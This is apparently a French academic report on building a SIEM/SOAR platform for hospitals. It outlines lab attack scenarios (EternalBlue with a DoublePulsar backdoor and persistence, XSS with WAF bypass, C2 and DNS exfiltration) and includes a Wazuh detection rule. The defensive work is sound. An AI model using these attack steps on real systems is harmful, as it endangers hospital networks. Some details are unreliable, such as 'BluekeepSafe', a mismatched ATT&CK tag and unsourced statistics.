Cette couche constitue le socle de l'architecture, collectant les événements bruts provenant de l'ensemble de l'infrastructure hospitalière. Elle gère la normalisation et la persistance des données de sécurité, garantissant leur intégrité et leur disponibilité pour les traitements ultérieurs.

\subsubsection{Couche de Détection (Layer 1)}
Intégrant Suricata, Wazuh et ModSecurity, cette couche assure la surveillance multi-niveaux de l'infrastructure. Elle implémente des mécanismes de détection signature-based et behavioral-based, adaptés aux spécificités de l'environnement hospitalier.

\subsubsection{Couche d'Analyse (Layer 2)}
Composée de TheHive, Cortex et MISP, cette couche enrichit les alertes avec du contexte métier et de l'intelligence sur les menaces. Elle automatise l'analyse des artefacts et facilite la prise de décision des analystes SOC.

\subsubsection{Couche d'Orchestration (Layer 3)}
Pilotée par n8n, cette couche automatise les workflows de réponse aux incidents. Elle coordonne les actions entre les différents composants et assure l'exécution des playbooks de sécurité.

\subsection{Topologie Réseau et Segmentation}

La topologie réseau proposée reflète les meilleures pratiques de segmentation sécuritaire :

\begin{itemize}
    \item \textbf{Segment SOAR (192.168.15.0/24)} : Héberge les services de sécurité critiques
    \item \textbf{Segment Administration (192.168.181.0/24)} : Accès de gestion et administration
    \item \textbf{Segment Cible (192.168.183.0/24)} : Systèmes surveillés et protégés
    \item \textbf{Réseaux Docker (172.20.0.0/16)} : Isolation des services containerisés
\end{itemize}

Cette segmentation permet un contrôle granulaire des flux de communication et limite la propagation latérale en cas de compromission.

\subsection{Flux de Données et Corrélation}

L'architecture implémente un pipeline de traitement des données optimisé pour la réactivité et la précision. Les flux de données suivent un modèle ETL (Extract, Transform, Load) adapté aux contraintes temps réel du monitoring sécuritaire.

\section{Chapitre 2 - Couche de Détection}

\subsection{Suricata - Détection Réseau Avancée}

Suricata fonctionne en mode hybride IDS/IPS, analysant le trafic réseau en temps réel. Sa configuration intègre :

\subsubsection{Règles de Détection}
Plus de 30 000 règles ET Open Rules, complétées par des règles personnalisées adaptées à l'environnement hospitalier. Ces règles couvrent :
\begin{itemize}
    \item Les exploits ciblant les équipements médicaux
    \item Les communications Command \& Control (C2)
    \item Les tentatives d'exfiltration de données sensibles
    \item Les anomalies comportementales réseau
\end{itemize}

\subsubsection{Moteurs d'Analyse}
L'implémentation exploite plusieurs moteurs d'analyse parallèles :
\begin{itemize}
    \item \textbf{Moteur de signatures} : Détection basée sur les patterns connus
    \item \textbf{Moteur de protocoles} : Analyse approfondie des protocoles applicatifs
    \item \textbf{Moteur de files} : Extraction et analyse des fichiers transmis
    \item \textbf{Moteur Lua} : Scripts personnalisés pour détections spécifiques
\end{itemize}

\subsection{Wazuh - SIEM Central}

Wazuh constitue le cœur du système de corrélation, collectant et analysant les événements de l'ensemble de l'infrastructure.

\subsubsection{Architecture Distribuée}
L'architecture Wazuh déployée comprend :
\begin{itemize}
    \item \textbf{Wazuh Manager} : Corrélation et gestion centralisée
    \item \textbf{Wazuh Indexer} : Stockage et indexation des événements (basé sur OpenSearch)
    \item \textbf{Wazuh Dashboard} : Interface de visualisation et d'analyse
    \item \textbf{Agents Wazuh} : Collecteurs déployés sur les endpoints
\end{itemize}

\subsubsection{Règles de Corrélation}
Développement de règles spécialisées pour l'environnement hospitalier :
\begin{itemize}
    \item Détection des accès non autorisés aux dossiers patients
    \item Monitoring des équipements médicaux critiques
    \item Surveillance des communications réseau suspectes
    \item Alertes de conformité HIPAA/RGPD
\end{itemize}

\subsection{ModSecurity - Protection Applicative}

ModSecurity assure la protection des applications web contre les attaques de couche applicative.

\subsubsection{Configuration WAF}
Déploiement en mode reverse proxy avec :
\begin{itemize}
    \item \textbf{OWASP Core Rule Set (CRS)} : Protection contre le Top 10 OWASP
    \item \textbf{Règles personnalisées} : Adaptées aux applications hospitalières
    \item \textbf{Modes de fonctionnement} : Detection et Prevention configurables
    \item \textbf{Logging avancé} : Capture détaillée des transactions HTTP/HTTPS
\end{itemize}

\section{Chapitre 3 - Stack SOAR}

\subsection{TheHive - Gestion Centralisée des Incidents}

TheHive centralise la gestion du cycle de vie des incidents de sécurité.

\subsubsection{Modèle de Données}
Structure hiérarchique organisée autour de :
\begin{itemize}
    \item \textbf{Alertes} : Événements de sécurité nécessitant une investigation
    \item \textbf{Cases} : Incidents confirmés en cours de traitement
    \item \textbf{Observables} : Artefacts techniques (IPs, hashes, domaines)
    \item \textbf{Tasks} : Actions à mener pour résoudre l'incident
\end{itemize}

\subsubsection{Templates Hospitaliers}
Développement de templates spécialisés :
\begin{itemize}
    \item \textbf{Incident de sécurité patient} : Gestion des brèches affectant les données de santé
    \item \textbf{Compromission d'équipement médical} : Procédures d'isolement et de restauration
    \item \textbf{Attaque ransomware} : Playbooks de réponse d'urgence
    \item \textbf{Tentative d'exfiltration} : Investigation et containment
\end{itemize}

\subsection{Cortex - Automatisation de l'Analyse}

Cortex automatise l'analyse des artefacts de sécurité via un système d'analyzers modulaires.

\subsubsection{Analyzers Déployés}
Configuration de plus de 100 analyzers couvrant :
\begin{itemize}
    \item \textbf{Reputation engines} : VirusTotal, AbuseIPDB, URLVoid
    \item \textbf{Threat intelligence} : Intégration MISP, feeds commerciaux
    \item \textbf{Sandbox analysis} : Analyse comportementale de malwares
    \item \textbf{Geolocation} : MaxMind, Shodan pour la contextualisation géographique
\end{itemize}

\subsubsection{Analyzers Personnalisés}
Développement d'analyzers spécialisés :
\begin{itemize}
    \item \textbf{Medical Device Checker} : Validation de conformité des équipements médicaux
    \item \textbf{HIPAA Compliance Analyzer} : Vérification de conformité réglementaire
    \item \textbf{Hospital Network Analyzer} : Analyse des communications intra-hospitalières
\end{itemize}

\subsection{MISP - Intelligence sur les Menaces}

MISP fournit la plateforme de threat intelligence collaborative.

\subsubsection{Feeds d'Intelligence}
Intégration de sources diversifiées :
\begin{itemize}
    \item \textbf{Feeds publics} : CIRCL OSINT, URLhaus, Feodo Tracker
    \item \textbf{Communautés sectorielles} : Partage d'IOCs entre établissements de santé
    \item \textbf{Intelligence commerciale} : Feeds premium pour menaces avancées
    \item \textbf{Intelligence interne} : IOCs générés par l'analyse d'incidents internes
\end{itemize}

\subsubsection{Objets MISP Personnalisés}
Création d'objets spécialisés pour le domaine médical :
\begin{itemize}
    \item \textbf{Medical-device-object} : Représentation des équipements médicaux
    \item \textbf{Hospital-network-object} : Modélisation des réseaux hospitaliers
    \item \textbf{Patient-data-breach-object} : Standardisation des incidents patients
\end{itemize}

\subsection{n8n - Orchestration des Workflows}

n8n automatise l'orchestration des réponses aux incidents via des workflows visuels.

\subsubsection{Workflows Opérationnels}
Implémentation de workflows couvrant :
\begin{itemize}
    \item \textbf{Traitement automatique des alertes} : Tri, enrichissement et escalade
    \item \textbf{Réponse aux incidents critiques} : Actions d'urgence automatisées
    \item \textbf{Reporting de conformité} : Génération automatique de rapports réglementaires
    \item \textbf{Notification multi-canal} : Email, SMS, intégrations messagerie
\end{itemize}

\section{Chapitre 4 - Scénarios d'Attaque et Validation}

\subsection{Méthodologie de Test}

La validation de l'architecture s'appuie sur des tests d'intrusion contrôlés, reproduisant des scénarios d'attaque réalistes dans un environnement de laboratoire sécurisé.

\subsubsection{Environnement de Test}
Configuration d'un laboratoire comprenant :
\begin{itemize}
    \item \textbf{Segment attaquant} : Machine Kali Linux (192.168.183.100)
    \item \textbf{Cibles variées} : Windows Server, stations de travail, applications web
    \item \textbf{Infrastructure de détection} : Stack SOAR complète
    \item \textbf{Monitoring} : Capture complète du trafic et des événements
\end{itemize}

\subsection{Scénario EternalBlue}

\subsubsection{Description Technique}
Exploitation de la vulnérabilité CVE-2017-0144 dans le service SMBv1 de Windows, permettant l'exécution de code à distance sans authentification.

\subsubsection{Implémentation d'Attaque}
Développement d'un exploit Metasploit personnalisé, décomposé en phases :
\begin{enumerate}
    \item \textbf{Reconnaissance} : Scan des ports SMB et identification des versions
    \item \textbf{Exploitation} : Envoi du payload EternalBlue
    \item \textbf{Post-exploitation} : Installation d'un backdoor DoublePulsar
    \item \textbf{Persistance} : Création de comptes utilisateur et tâches planifiées
\end{enumerate}

\subsubsection{Détection et Réponse}
La stack SOAR détecte l'attaque via :
\begin{itemize}
    \item \textbf{Suricata} : Signatures spécifiques aux patterns EternalBlue
    \item \textbf{Wazuh} : Corrélation des événements Windows et analyse comportementale
    \item \textbf{Réponse automatique} : Isolation réseau, capture forensique, notification
\end{itemize}

\subsection{Scénario XSS}

\subsubsection{Attaques Cross-Site Scripting}
Tests de plusieurs variantes d'attaques XSS :
\begin{itemize}
    \item \textbf{Reflected XSS} : Injection via paramètres URL
    \item \textbf{Stored XSS} : Persistance en base de données
    \item \textbf{DOM-based XSS} : Exploitation côté client
    \item \textbf{Bypass techniques} : Contournement des protections WAF
\end{itemize}

\subsubsection{Protection ModSecurity}
Configuration avancée incluant :
\begin{itemize}
    \item \textbf{OWASP CRS} : Règles de base contre XSS
    \item \textbf{Règles personnalisées} : Adaptées aux applications hospitalières
    \item \textbf{Machine learning} : Détection des payloads obfusqués
    \item \textbf{Response actions} : Blocage automatique et logging détaillé
\end{itemize}

\subsection{Scénario Sites Malveillants}

\subsubsection{Simulation de Trafic Malveillant}
Génération automatisée de requêtes vers des domaines malveillants, simulant :
\begin{itemize}
    \item \textbf{Communications C2} : Beaconing vers serveurs de commande
    \item \textbf{Exfiltration DNS} : Tunneling de données via requêtes DNS
    \item \textbf{Malware downloads} : Téléchargement de fichiers suspects
    \item \textbf{Phishing} : Accès à sites de hameçonnage
\end{itemize}

\section{Chapitre 5 - Intégrations et APIs}

\subsection{Connecteurs Développés}

Création de connecteurs spécialisés pour l'intégration avec :
\begin{itemize}
    \item \textbf{Systèmes d'Information Hospitaliers (SIH)} : HL7, FHIR
    \item \textbf{Équipements médicaux} : DICOM, Modbus, protocoles propriétaires
    \item \textbf{Systèmes de gestion des identités} : Active Directory, LDAP
    \item \textbf{Solutions de sauvegarde} : Intégration pour la restauration post-incident
\end{itemize}

\subsection{APIs REST}

Développement d'APIs standardisées pour :
\begin{itemize}
    \item \textbf{Ingestion d'événements} : Endpoints pour sources tierces
    \item \textbf{Consultation d'alertes} : Interface programmatique pour outils externes
    \item \textbf{Automation externe} : Triggers pour systèmes de réponse automatique
    \item \textbf{Reporting} : Génération programmatique de rapports
\end{itemize}

\section{Chapitre 6 - Déploiement et Configuration}

\subsection{Containerisation Docker}

L'ensemble de la solution est containerisé pour faciliter le déploiement :
\begin{itemize}
    \item \textbf{Images optimisées} : Containers spécialisés pour chaque composant
    \item \textbf{Orchestration Docker Compose} : Déploiement coordonné des services
    \item \textbf{Volumes persistants} : Sauvegarde des données critiques
    \item \textbf{Réseaux isolés} : Segmentation au niveau container
\end{itemize}

\subsection{Scripts d'Installation}

Automatisation complète du déploiement via :
\begin{itemize}
    \item \textbf{Scripts Bash} : Installation automatisée sur Ubuntu/CentOS
    \item \textbf{Playbooks Ansible} : Configuration infrastructure as code
    \item \textbf{Templates Terraform} : Provisioning cloud automatisé
    \item \textbf{Health checks} : Validation automatique du déploiement
\end{itemize}

\subsection{Configuration de Production}

Paramétrage optimisé pour l'environnement de production :
\begin{itemize}
    \item \textbf{Haute disponibilité} : Clustering et load balancing
    \item \textbf{Monitoring} : Surveillance de la santé des services
    \item \textbf{Backup} : Stratégies de sauvegarde automatisées
    \item \textbf{Security hardening} : Durcissement sécuritaire des composants
\end{itemize}

\section{Chapitre 7 - Documentation et Maintenance}

\subsection{Documentation Technique}

Création d'une documentation exhaustive comprenant :
\begin{itemize}
    \item \textbf{Guides d'installation} : Procédures pas-à-pas détaillées
    \item \textbf{Manuels d'utilisation} : Interfaces et fonctionnalités utilisateur
    \item \textbf{Guides de troubleshooting} : Résolution des problèmes courants
    \item \textbf{Documentation API} : Spécifications techniques complètes
\end{itemize}

\subsection{Formation et Transfert de Compétences}

Programme de formation structuré incluant :
\begin{itemize}
    \item \textbf{Formation administrateurs} : Gestion et maintenance de la solution
    \item \textbf{Formation analystes SOC} : Utilisation opérationnelle quotidienne
    \item \textbf{Formation RSSI} : Pilotage stratégique et reporting
    \item \textbf{Certification utilisateurs} : Validation des compétences acquises
\end{itemize}

\subsection{Maintenance Évolutive}

Stratégie de maintenance long terme :
\begin{itemize}
    \item \textbf{Mises à jour sécuritaires} : Patch management automatisé
    \item \textbf{Évolutions fonctionnelles} : Roadmap d'amélioration continue
    \item \textbf{Optimisation performances} : Tuning proactif des composants
    \item \textbf{Support utilisateur} : Helpdesk spécialisé cybersécurité
\end{itemize}

\section{Cohérence Architecturale et Intégration}

Cette organisation en chapitres reflète la démarche méthodologique adoptée, chaque composant s'intégrant dans une architecture globale cohérente. L'approche modulaire facilite la maintenance, l'évolution et l'adaptation de la solution aux besoins spécifiques de chaque établissement hospitalier.

La documentation détaillée de chaque chapitre permet une compréhension approfondie des choix techniques, des configurations déployées et des résultats obtenus, facilitant la reproduction et l'adaptation de la solution dans d'autres contextes.

\newpage

% ===== CHAPITRES PRINCIPAUX =====
\chapter{Contexte et Problematique}

\section{Introduction a la Cybersecurite Hospitaliere}

\subsection{Enjeux de la Securite dans le Secteur de la Sante}

Le secteur de la sante represente aujourd'hui l'une des cibles privilegiees des cybercriminels. Selon le rapport annuel de l'ANSSI 2024, les etablissements de sante ont subi une augmentation de 47\% des cyberattaques par rapport a l'annee precedente. Cette vulnerabilite accrue s'explique par plusieurs facteurs :

\begin{itemize}
    \item \textbf{Criticite des donnees} : Les dossiers medicaux electroniques (EMR) contiennent des informations hautement sensibles
    \item \textbf{Continuite de service} : L'impossibilite d'interrompre les soins met les hopitaux en position de faiblesse
    \item \textbf{Infrastructure complexe} : Interconnexion de systemes heterogenes (PACS, SIS, equipements biomedicaux)
    \item \textbf{Contraintes reglementaires} : Conformite RGPD, HDS, et normes de securite sanitaire
\end{itemize}

\subsection{Specificites de l'Environnement Hospitalier}

L'ecosysteme informatique hospitalier presente des caracteristiques uniques qui complexifient la mise en œuvre de solutions de securite traditionnelles :

\paragraph{Heterogeneite des Systemes}
L'infrastructure hospitaliere integre :
\begin{enumerate}
    \item \textbf{Systemes d'Information Hospitaliers (SIH)} : Gestion administrative et medicale
    \item \textbf{PACS (Picture Archiving and Communication System)} : Archivage et communication d'images medicales
    \item \textbf{Equipements biomedicaux connectes} : Moniteurs, pompes a perfusion, ventilateurs
    \item \textbf{Reseaux de telecommunication} : VoIP, systemes d'appel infirmier
    \item \textbf{Systemes de securite physique} : Controle d'acces, videosurveillance
\end{enumerate}

\paragraph{Contraintes Operationnelles}
\begin{itemize}
    \item \textbf{Disponibilite 24/7} : Aucune interruption de service acceptable
    \item \textbf{Temps de reponse critique} : Latence maximale de quelques millisecondes pour certains equipements
    \item \textbf{Mobilite du personnel} : Acces nomade et connexions multiples
    \item \textbf{Interoperabilite} : Communication entre systemes de differents editeurs
\end{itemize}

\subsection{Topologie Reseau Hospitaliere}

La figure \ref{fig:network_topology} illustre la complexite de l'architecture reseau d'un etablissement hospitalier moderne, montrant l'interconnexion des differents systemes et les flux de donnees critiques.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/network_topology.png}
    \caption{Topologie reseau hospitaliere - Vue d'ensemble de l'infrastructure}
    \label{fig:network_topology}
\end{figure}

Cette architecture met en evidence les points de vulnerabilite et les zones critiques necessitant une surveillance renforcee. La segmentation reseau et la mise en place de points de controle sont essentielles pour assurer la securite de l'ensemble du systeme.

\section{Analyse des Menaces Specifiques}

\subsection{Typologie des Attaques sur les Etablissements de Sante}

\subsubsection{Ransomwares}

Les attaques par ransomware representent 67\% des incidents de securite dans le secteur hospitalier. Les variantes les plus observees incluent :

\begin{table}[H]
    \centering
    \caption{Principales familles de ransomware ciblant les hopitaux}
    \begin{tabular}{|l|l|c|l|}
        \hline
        \textbf{Famille} & \textbf{Vecteur d'Infection} & \textbf{Frequence} & \textbf{Impact Typique}    \\
        \hline
        WannaCry         & EternalBlue (SMBv1)          & 23\%               & Paralysie complete du SIH  \\
        \hline
        NotPetya         & Credential dumping           & 18\%               & Destruction de donnees     \\
        \hline
        Ryuk             & Phishing cible               & 15\%               & Chiffrement selectif       \\
        \hline
        Conti            & RDP/VPN compromise           & 12\%               & Exfiltration + chiffrement \\
        \hline
        Lockbit          & Supply chain                 & 8\%                & Attaque multi-sites        \\
        \hline
    \end{tabular}
\end{table}

\subsubsection{Compromission d'Equipements Biomedicaux}

Les equipements biomedicaux connectes presentent des vulnerabilites specifiques :

\begin{itemize}
    \item \textbf{Systemes d'exploitation obsoletes} : Windows XP/7 sans mise a jour de securite
    \item \textbf{Protocoles de communication non securises} : DICOM, HL7 sans chiffrement
    \item \textbf{Mots de passe par defaut} : Configurations d'usine non modifiees
    \item \textbf{Absence de monitoring} : Equipements isoles des systemes de surveillance
\end{itemize}

\subsection{Vecteurs d'Attaque Identifies}

L'analyse des incidents de securite dans notre environnement de test a permis d'identifier les principaux vecteurs d'attaque :

\paragraph{Attaques Reseau}
\begin{enumerate}
    \item \textbf{Exploitation de vulnerabilites SMB} : EternalBlue (MS17-010), BluekeepSafe (CVE-2019-0708)
    \item \textbf{Attaques par deni de service} : Saturation des equipements critiques
    \item \textbf{Man-in-the-middle} : Interception de communications medicales non chiffrees
    \item \textbf{Lateral movement} : Propagation horizontale apres compromission initiale
\end{enumerate}

\paragraph{Attaques Applicatives}
\begin{enumerate}
    \item \textbf{Injection SQL} : Compromission des bases de donnees patient
    \item \textbf{Cross-Site Scripting (XSS)} : Vol de sessions utilisateur
    \item \textbf{Injection de commandes} : Execution de code arbitraire
    \item \textbf{Elevation de privileges} : Compromission de comptes administrateur
\end{enumerate}

\section{Etat de l'Art des Solutions SIEM/SOAR}

\subsection{Technologies SIEM Existantes}

\subsubsection{Solutions Commerciales}

\begin{table}[H]
    \centering
    \caption{Comparaison des solutions SIEM commerciales}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Solution} & \textbf{EPS Max} & \textbf{Cout/GB} & \textbf{IA/ML} & \textbf{SOAR Integre} \\
        \hline
        Splunk Enterprise & 150K             & 15€              & Oui            & Phantom               \\
        \hline
        IBM QRadar        & 100K             & 12€              & Oui            & SOAR natif            \\
        \hline
        ArcSight ESM      & 75K              & 18€              & Partiel        & SOAR externe          \\
        \hline
        LogRhythm         & 50K              & 10€              & Oui            & SOAR natif            \\
        \hline
        Sentinel (Azure)  & Illimite         & 2.3€             & Oui            & Logic Apps            \\
        \hline
    \end{tabular}
\end{table}

\subsubsection{Solutions Open Source}

Les solutions open source offrent une alternative economiquement viable pour les etablissements de sante :

\begin{itemize}
    \item \textbf{Wazuh} : SIEM/XDR avec detection comportementale avancee
    \item \textbf{OSSEC} : Systeme de detection d'intrusion host-based
    \item \textbf{ELK Stack} : Elasticsearch, Logstash, Kibana pour l'analyse de logs
    \item \textbf{Graylog} : Plateforme de gestion centralisee des logs
    \item \textbf{OSSIM/AlienVault} : SIEM communautaire avec correlation de regles
\end{itemize}

\subsection{Plateformes SOAR}

\subsubsection{Orchestration et Automatisation}

Les plateformes SOAR (Security Orchestration, Automation and Response) permettent l'automatisation des processus de reponse aux incidents :

\paragraph{TheHive}
\begin{itemize}
    \item Gestion collaborative des incidents de securite
    \item Workflows personnalisables pour differents types d'alertes
    \item Integration native avec Cortex pour l'analyse automatisee
    \item API REST complete pour l'integration avec les SIEM
\end{itemize}

\paragraph{Cortex}
\begin{itemize}
    \item Plateforme d'analyse d'observables et d'artifacts
    \item Bibliotheque de plus de 100 analyzers
    \item Responders pour automatiser les actions de reponse
    \item Support des formats STIX/TAXII pour le partage de CTI
\end{itemize}

\paragraph{MISP}
\begin{itemize}
    \item Plateforme de partage de renseignement sur les menaces
    \item Base de donnees collaborative d'IOCs
    \item Taxonomies standardisees (MITRE ATT\&CK, Kill Chain)
    \item Feeds automatiques de threat intelligence
\end{itemize}

\section{Objectifs et Defis du Projet}

\subsection{Objectifs Principaux}

Ce projet vise a concevoir et implementer une solution SIEM/SOAR adaptee aux specificites de l'environnement hospitalier. Les objectifs principaux sont :

\begin{enumerate}
    \item \textbf{Detection Precoce} : Identifier les menaces dans les 5 premieres secondes
    \item \textbf{Reponse Automatisee} : Contenir 80\% des incidents sans intervention humaine
    \item \textbf{Conformite Reglementaire} : Respecter les exigences RGPD et HDS
    \item \textbf{Continuite de Service} : Maintenir la disponibilite des systemes critiques
    \item \textbf{Integration Transparente} : S'adapter a l'infrastructure existante
\end{enumerate}

\subsection{Defis Techniques Identifies}

\subsubsection{Defis d'Architecture}

\begin{itemize}
    \item \textbf{Scalabilite horizontale} : Traitement de 100K+ evenements par seconde
    \item \textbf{Haute disponibilite} : Redondance active/passive avec failover automatique
    \item \textbf{Chiffrement de bout en bout} : Protection des donnees medicales en transit
    \item \textbf{Segmentation reseau} : Isolation des environnements critiques
\end{itemize}

\subsubsection{Defis Operationnels}

\begin{itemize}
    \item \textbf{Formation du personnel} : Appropriation des outils par les equipes SOC
    \item \textbf{Tuning des regles} : Reduction du taux de faux positifs sous 5\%
    \item \textbf{Integration des processus} : Alignement avec les procedures existantes
    \item \textbf{Cout total de possession} : Optimisation des ressources et licences
\end{itemize}

\subsection{Metriques de Succes}

\begin{table}[H]
    \centering
    \caption{Indicateurs cles de performance (KPI) du projet}
    \begin{tabular}{|l|c|c|}
        \hline
        \textbf{Indicateur}       & \textbf{Valeur Cible} & \textbf{Methode de Mesure} \\
        \hline
        Temps de detection moyen  & < 30 secondes         & Monitoring automatique     \\
        \hline
        Taux de faux positifs     & < 5\%                 & Analyse hebdomadaire       \\
        \hline
        Temps de reponse incident & < 15 minutes          & Metrics TheHive            \\
        \hline
        Disponibilite systeme     & > 99.9\%              & Monitoring Nagios          \\
        \hline
        Couverture MITRE ATT\&CK  & > 80\%                & Mapping des regles         \\
        \hline
        Satisfaction utilisateur  & > 4/5                 & Enquete trimestrielle      \\
        \hline
    \end{tabular}
\end{table}

Cette premiere approche contextuelle etablit les fondements de notre projet SIEM/SOAR, en mettant en evidence les enjeux specifiques du secteur hospitalier et les defis techniques a relever.

\chapter{Methodologie et Approche Technique}

\section{Methodologie de Developpement}

\subsection{Cycle de Vie du Projet}

Le developpement de notre solution SIEM/SOAR suit une approche iterative basee sur la methodologie DevSecOps, adaptee aux contraintes de securite et de disponibilite de l'environnement hospitalier.
\subsubsection{Phases de Developpement}
\begin{enumerate}
    \item \textbf{Phase d'Analyse} (1 semaines)
          \begin{itemize}
              \item Audit de l'infrastructure existante
              \item Identification des sources de logs
              \item Analyse des flux reseau critiques
              \item Mapping des exigences reglementaires
          \end{itemize}

    \item \textbf{Phase de Conception} (3 semaines)
          \begin{itemize}
              \item Architecture de la solution SIEM/SOAR
              \item Definition des cas d'usage prioritaires
              \item Conception des workflows d'automatisation
              \item Specification des integrations API
          \end{itemize}

    \item \textbf{Phase d'Implementation} (3 semaines)
          \begin{itemize}
              \item Deploiement de l'infrastructure de base
              \item Configuration des connecteurs de donnees
              \item Developpement des regles de correlation
              \item Integration des composants SOAR
          \end{itemize}

    \item \textbf{Phase de Tests} (2 semaines)
          \begin{itemize}
              \item Tests de charge et performance
              \item Validation des scenarios d'attaque
              \item Tests d'integration bout en bout
              \item Audit de securite externe
          \end{itemize}


\end{enumerate}
\clearpage

\subsection{Methodologie de Securite}


\subsubsection{Framework NIST Cybersecurity}

Notre approche s'aligne sur le framework NIST CSF :

\begin{table}[H]
    \centering
    \caption{Mapping NIST Cybersecurity Framework}
    \begin{tabular}{|l|l|l|}
        \hline
        \textbf{Fonction} & \textbf{Composant SIEM/SOAR} & \textbf{Implementation}             \\
        \hline
        Identify          & Asset Discovery              & Wazuh Agent Inventory               \\
        \hline
        Protect           & Access Control               & RBAC + MFA                          \\
        \hline
        Detect            & Event Correlation            & Wazuh Rules Engine + Suricata Rules \\
        \hline
        Respond           & Incident Response            & TheHive Workflows                   \\
        \hline
        Recover           & Business Continuity          & Automated Backup                    \\
        \hline
    \end{tabular}
\end{table}

\section{Architecture Technique Detaillee}

\subsection{Architecture Globale du Systeme}

\subsubsection{Vue d'Ensemble}

L'architecture de notre solution SIEM/SOAR s'articule autour de quatre couches principales, chacune ayant des responsabilites specifiques et des interfaces bien definies.

\begin{figure}[H]
    \centering
    \includegraphics[width=0.9\textwidth]{images/network_security_flow.png}
    \caption{Architecture globale de la solution SIEM/SOAR hospitaliere - Flux de securite}
    \label{fig:architecture_globale}
\end{figure}

La figure \ref{fig:architecture_globale} illustre les flux de donnees et les interactions entre les differents composants de notre solution. Cette architecture garantit une collecte exhaustive des evenements de securite et leur traitement en temps reel.

\subsection{Diagrammes de Flux de Donnees}

\subsubsection{Flux de Donnees Simplifie}

Pour une comprehension initiale, la figure \ref{fig:flow_simple} presente une vue simplifiee des flux de donnees principaux :

\begin{figure}[H]
    \centering
    \includegraphics[width=0.8\textwidth]{images/flowData_simple.png}
    \caption{Diagramme de flux de donnees simplifie}
    \label{fig:flow_simple}
\end{figure}

\subsubsection{Couche de Collecte de Donnees}

\paragraph{Sources de Donnees}
\begin{enumerate}
    \item \textbf{Logs Systeme}
          \begin{itemize}
              \item Serveurs Windows ( Sysmon, WazuhAgent)
              \item Serveurs Linux (WazuhAgent)
          \end{itemize}


    \item \textbf{Logs de Securite}
          \begin{itemize}
              \item Firewalls (pfSense)
              \item IDS/IPS (Suricata)
              \item WAF (ModSecurity)
          \end{itemize}

    \item \textbf{Donnees de Contexte}
          \begin{itemize}
              \item Threat Intelligence (MISP feeds)
              \item Vulnerabilites (NIST NVD)
          \end{itemize}
\end{enumerate}

\paragraph{Mecanismes de Collecte}
\begin{itemize}
    \item \textbf{Wazuh Agents} : Deploiement sur endpoints Windows/Linux
    \item \textbf{Syslog forwarding} : Collecte centralisee des logs reseau
    \item \textbf{API REST} : Integration avec applications tierces
    \item \textbf{File monitoring} : Surveillance de fichiers de logs
    \item \textbf{Windows Event Logs} : Collecte native via WinRM
\end{itemize}

\subsection{Couche de Traitement et Correlation}

\subsubsection{Wazuh SIEM - Moteur de Correlation}

\paragraph{Architecture Distribuee}
\begin{itemize}
    \item \textbf{Wazuh Manager} : Serveur central de correlation (Master)
    \item \textbf{Wazuh Workers} : Serveurs de traitement distribue
    \item \textbf{Wazuh Indexer} : Cluster Elasticsearch pour stockage
    \item \textbf{Wazuh Dashboard} : Interface de visualisation Kibana
\end{itemize}

\paragraph{Regles de Correlation Personnalisees}

Les regles de correlation sont developpees pour detecter les attaques specifiques a l'environnement hospitalier :

\begin{lstlisting}[style=xmlstyle,caption=Exemple de regle Wazuh pour detection EternalBlue]
<group name="eternalblue,windows,exploit">
  <!-- EternalBlue SMB exploit detection -->
  <rule id="100001" level="12">
    <if_sid>18152</if_sid>
    <srcip>!$HOME_NET</srcip>
    <dstport>445</dstport>
    <match>SMB|CIFS</match>
    <description>EternalBlue: SMB exploit attempt from external IP</description>
    <group>attack.lateral_movement,attack.t1055</group>
  </rule>
</group>
\end{lstlisting}

\subsubsection{Enrichissement des Evenements}

\paragraph{Geolocalisation IP}
\begin{itemize}
    \item Base GeoIP MaxMind pour localisation geographique
    \item Detection d'acces depuis pays a risque
    \item Calcul de distance impossible (Impossible Travel)
    \item Correlation avec listes de reputation IP
\end{itemize}



\subsection{Couche d'Orchestration SOAR}

\subsubsection{TheHive - Gestion d'Incidents}

\paragraph{Modele de Donnees}
\begin{itemize}
    \item \textbf{Alerts} : Evenements de securite bruts depuis le SIEM
    \item \textbf{Cases} : Incidents de securite confirmes necessitant investigation
    \item \textbf{Tasks} : Actions specifiques dans le cadre d'un incident
    \item \textbf{Observables} : IOCs extraits et analyses (IP, hash, domaine)
\end{itemize}

\paragraph{Workflows Automatises}
\begin{enumerate}
    \item \textbf{Enrichissement Contextuel}
          \begin{itemize}
              \item Recherche historique d'incidents similaires
              \item Correlation avec threat intelligence MISP
          \end{itemize}

    \item \textbf{Reponse Automatisee}
          \begin{itemize}
              \item Isolation reseau d'endpoints compromis
              \item Blocage automatique d'IP malveillantes
              \item Revocation de sessions utilisateur
              \item Sauvegarde forensique de preuves
          \end{itemize}
\end{enumerate}

\subsubsection{Cortex - Analyse d'Observables}

\paragraph{Analyzers Deployes}
\begin{table}[H]
    \centering
    \caption{Analyzers Cortex configures pour l'environnement hospitalier}
    \begin{tabular}{|l|l|c|l|}
        \hline
        \textbf{Type} & \textbf{Analyzer} & \textbf{SLA} & \textbf{Cas d'Usage}    \\
        \hline
        IP            & VirusTotal        & 30s          & Reputation IP externe   \\
        \hline
        URL           & Joe Sandbox       & 5min         & Analyse comportementale \\
        \hline
        Email         & DMARC Analyzer    & 10s          & Validation authenticity \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Responders Personnalises}
\begin{itemize}
    \item \textbf{pfSense IP Block} : Blocage automatique au niveau firewall
    \item \textbf{MISP Event Creation} : Publication IOC vers communaute
\end{itemize}

\subsection{Couche d'Integration et Automatisation}

\subsubsection{n8n - Orchestrateur de Workflows}

\paragraph{Architecture n8n}
\begin{itemize}
    \item \textbf{Execution Mode} : Queue-based avec Redis backend
    \item \textbf{Scaling} : Horizontal scaling avec load balancer
    \item \textbf{Persistence} : PostgreSQL pour etat des workflows
    \item \textbf{Security} : JWT authentication avec rotation automatique
\end{itemize}

\paragraph{Workflows Critiques Implementes}

\begin{enumerate}
    \item \textbf{Workflow EternalBlue Response}
          \begin{itemize}
              \item Trigger : Wazuh alert rule 100001
              \item Actions : Isolation reseau + analyse forensique + notification
              \item SLA : Reponse en < 60 secondes
              \item Escalade : SOC Manager si echec automatisation
          \end{itemize}

    \item \textbf{Workflow XSS Detection}
          \begin{itemize}
              \item Trigger : ModSecurity WAF block
              \item Actions : Analyse payload + bloc IP + notification developpeur
              \item SLA : Traitement en < 30 secondes
          \end{itemize}

    \item \textbf{Workflow Malicious Website}
          \begin{itemize}
              \item Trigger : DNS sinkhole hit
              \item Actions : Investigation utilisateur + formation + rapport
